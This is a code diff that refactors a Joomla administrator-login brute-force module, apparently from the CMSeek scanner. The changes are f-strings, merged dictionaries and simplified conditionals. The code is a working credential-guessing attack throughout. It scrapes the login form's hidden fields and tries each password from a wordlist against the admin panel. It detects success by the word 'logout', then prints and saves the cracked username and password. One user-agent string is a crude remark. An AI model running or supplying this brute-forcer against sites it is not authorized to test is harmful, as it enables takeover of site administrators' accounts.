@@ -33,14 +33,14 @@ class extInpTags(HTMLParser):
             for nm,val in attrs:
                 if nm == "name":
                     name = val
-                if nm == "value":
+                elif nm == "value":
                     value = val
             if name is not None and value is not None:
                 self.return_array.update({name:value})
 
 
 def testlogin(url,user,passw):
-    url = url + '/administrator/index.php'
+    url = f'{url}/administrator/index.php'
     cj = http.cookiejar.FileCookieJar("cookieszz")
     opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
     joomloginsrc = opener.open(url).read().decode()
@@ -49,7 +49,7 @@ def testlogin(url,user,passw):
     main_param = {'username':user, 'passwd':passw}
     other_param = parser.return_array
     post_data = main_param.copy()
-    post_data.update(other_param)
+    post_data |= other_param
     post_datad = urllib.parse.urlencode(post_data).encode("utf-8")
     ua = cmseek.randomua('generatenewuaeverytimetobesafeiguess')
     try:
@@ -57,12 +57,10 @@ def testlogin(url,user,passw):
             scode = response.read().decode()
             headers = str(response.info())
             rurl = response.geturl()
-            r = ['1', scode, headers, rurl] ## 'success code', 'source code', 'http headers', 'redirect url'
-            return r
+            return ['1', scode, headers, rurl]
     except Exception as e:
         e = str(e)
-        r = ['2', e, '', ''] ## 'error code', 'error message', 'empty'
-        return r
+        return ['2', e, '', '']
     print('hola')
 
 
@@ -91,54 +89,41 @@ def start():
                 joomcnf = '1'
             else:
                 try3 = header.check(bsrc[2]) # Headers Check!
-                if try3[0] == '1' and try3[1] == 'joom':
-                    joomcnf = '1'
-                else:
-                    joomcnf = '0'
+                joomcnf = '1' if try3[0] == '1' and try3[1] == 'joom' else '0'
     if joomcnf != '1':
         cmseek.error('Could not confirm Joomla... CMSeek is quitting')
         cmseek.handle_quit()
     else:
         cmseek.success("Joomla Confirmed... Confirming form and getting token...")
-        joomloginsrc = cmseek.getsource(url + '/administrator/index.php', cmseek.randomua('thatsprettygay'))
+        joomloginsrc = cmseek.getsource(
+            f'{url}/administrator/index.php', cmseek.randomua('thatsprettygay')
+        )
         if joomloginsrc[0] == '1' and '<form' in joomloginsrc[1]:
-            # joomtoken = re.findall(r'type=\"hidden\" name=\"(.*?)\" value=\"1\"', joomloginsrc[1])
-            # if len(joomtoken) == 0:
-            #    cmseek.error('Unable to get token... CMSeek is quitting!')
-            #    cmseek.handle_quit()
-            # cmseek.success("Token grabbed successfully: " + cmseek.bold + joomtoken[0] + cmseek.cln)
-            # token = joomtoken[0]
-            joomparamuser = []
             rawuser = input("[~] Enter Usernames with coma as separation without any space (example: cris,harry): ").split(',')
-            for rusr in rawuser:
-                joomparamuser.append(rusr)
+            joomparamuser = list(rawuser)
             joombruteusers = set(joomparamuser) ## Strip duplicate usernames in case any smartass didn't read the full thing and entered admin as well
             for user in joombruteusers:
                 passfound = '0'
                 print('\n')
-                cmseek.info("Bruteforcing User: " + cmseek.bold + user + cmseek.cln)
+                cmseek.info(f"Bruteforcing User: {cmseek.bold}{user}{cmseek.cln}")
                 pwd_file = open("wordlist/passwords.txt", "r")
                 passwords = pwd_file.read().split('\n')
                 passwords.insert(0, user)
                 for password in passwords:
-                    if password != '' and password != '\n':
+                    if password not in ['', '\n']:
                         sys.stdout.write('[*] Testing Password: ')
                         sys.stdout.write('%s\r\r' % password)
                         sys.stdout.flush()
                         # print("Testing Pass: " + password)
                         cursrc = testlogin(url, user, password)
-                        # print('Token: ' + token)
-                        # print("Ret URL: " + str(cursrc[3]))
-                        if 'logout' in str(cursrc[1]):
-                            print('\n')
-                            cmseek.success('Password found!')
-                            print(" |\n |--[username]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[password]--> " + cmseek.bold + password + cmseek.cln + "\n |")
-                            cmseek.success('Enjoy The Hunt!')
-                            cmseek.savebrute(url,url + '/administrator/index.php',user,password)
-                            passfound = '1'
-                            break
-                        else:
+                        if 'logout' not in str(cursrc[1]):
                             continue
+                        print('\n')
+                        cmseek.success('Password found!')
+                        print(" |\n |--[username]--> " + cmseek.bold + user + cmseek.cln + "\n |\n |--[password]--> " + cmseek.bold + password + cmseek.cln + "\n |")
+                        cmseek.success('Enjoy The Hunt!')
+                        cmseek.savebrute(url, f'{url}/administrator/index.php', user, password)
+                        passfound = '1'
                         break
                 if passfound == '0':
                         cmseek.error('\n\nCould Not find Password!')
